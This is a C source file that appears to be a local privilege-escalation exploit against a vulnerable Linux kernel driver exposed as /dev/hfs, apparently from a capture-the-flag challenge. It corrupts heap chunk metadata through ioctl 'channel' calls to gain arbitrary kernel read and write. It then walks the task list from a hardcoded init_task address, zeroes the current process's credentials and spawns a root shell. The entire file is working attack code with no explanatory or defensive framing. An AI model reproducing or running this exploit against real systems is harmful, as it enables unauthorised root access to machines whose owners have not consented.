#include <fcntl.h>

#define CHANNEL_CREATE 0xABCD0001
#define CHANNEL_DELETE 0xABCD0002
#define CHANNEL_READ   0xABCD0003
#define CHANNEL_WRITE  0xABCD0004

#define INIT_TASK 0xffffffff81a1b4c0
#define OFFSET_TASKS 0x1d0
#define OFFSET_PID 0x278
#define OFFSET_CRED 0x3c0

struct channel_info {
    long id;
    long size;
    char *buffer;
};

int ioctl(int fd, unsigned long request, unsigned long param) {
    return syscall(16, fd, request, param);
}

// Create a new hfs channel
void create_channel(int fd, int id, int size) {
    struct channel_info channel;

    channel.id = id;
    channel.size = size;

    ioctl(fd, CHANNEL_CREATE, &channel);
}

// Delete hfs channel
void delete_channel(int fd, long id) {
    ioctl(fd, CHANNEL_DELETE, &id);
}

// Read from hfs channel into dest
void read_channel(int fd, int id, char *dest, int size) {
    struct channel_info channel;

    channel.id = id;
    channel.size = size;
    channel.buffer = dest;

    ioctl(fd, CHANNEL_READ, &channel);
}

// Write into hfs channel from src
void write_channel(int fd, int id, char *src, int size) {
    struct channel_info channel;

    channel.id = id;
    channel.size = size;
    channel.buffer = src;

    ioctl(fd, CHANNEL_WRITE, &channel);
}

void read_data(int fd, long address, char *dest, long size) {
    printf("[+] Read data from %p\n", address);

    long pPayload[3] = { 9, address, 0xffffffffffffffff};

    // Overwrite channel object 9
    write_channel(fd, 4, pPayload, 0x18);

    // Use channel 9 to read data
    memset(dest, 0, size);
    read_channel(fd, 9, dest, size);
}

void write_data(int fd, long address, char *src, long size) {
    printf("[+] Write data to %p\n", address);

    long pPayload[3] = { 9, address, 0xffffffffffffffff};

    // Overwrite channel object 9
    write_channel(fd, 4, pPayload, 0x18);
    
    // Use channel 9 to write data
    write_channel(fd, 9, src, size);
}

long read_address(int fd, long address) {
    printf("[+] Read address from %p\n", address);
    
    long result = 0;
    
    read_data(fd, address, &result, 0x8);

    return result;
}

void write_address(int fd, long address, long value) {
    printf("[+] Write '%p' to '%p'\n", value, address);

    long pPayload[3] = { 9, address, 0x3000};

    write_channel(fd, 4, pPayload, 0x18);

    write_channel(fd, 9, &value, 4);    
}

int main(int argc, char *argv) {
    int fd;

    printf("[+] Open hfs device\n");
    fd = open("/dev/hfs", O_RDWR);

    printf("[+] Create initial channels\n");

    char payload[0x1000];
    memset(payload, 0, 0x100);

    create_channel(fd, 1, 0x20);
    create_channel(fd, 2, 0x20);
    create_channel(fd, 3, 0x20);
    create_channel(fd, 4, 0x20);
    create_channel(fd, 5, 0x20);
    create_channel(fd, 6, 0x20);
    
    memset(payload, 0x41, 0x20);

    printf("[+] Free channel 3\n");
    delete_channel(fd, 3);

    payload[0x20] = 0x40;

    printf("[+] Overwrite LSB of channel 3 FD\n");
    write_channel(fd, 2, payload, 0x21);

    printf("[+] Recreate channel 3 (with different chunk size)\n");
    create_channel(fd, 8, 0x40);

    printf("[+] Create next channel (inside channel 4 data)\n");
    create_channel(fd, 9, 0x40);

    long task = INIT_TASK;

    while((task = read_address(fd, task + OFFSET_TASKS + 8) - OFFSET_TASKS) != INIT_TASK) {
        int pid = read_address(fd, task + OFFSET_PID);

        printf("task = %p, pid = %d\n", (void *) task, pid);

        if(pid != getpid()) 
            continue;        

        puts("found current task!");

        long cred = read_address(fd, task + OFFSET_CRED);

        for(int i = 0; i < 5; i++) {
            write_address(fd, cred + i * 4, 0);
        }

        break;
    }
    
    setresuid(0, 0, 0);
    system("/bin/sh");

    close(fd);

    return 0;
}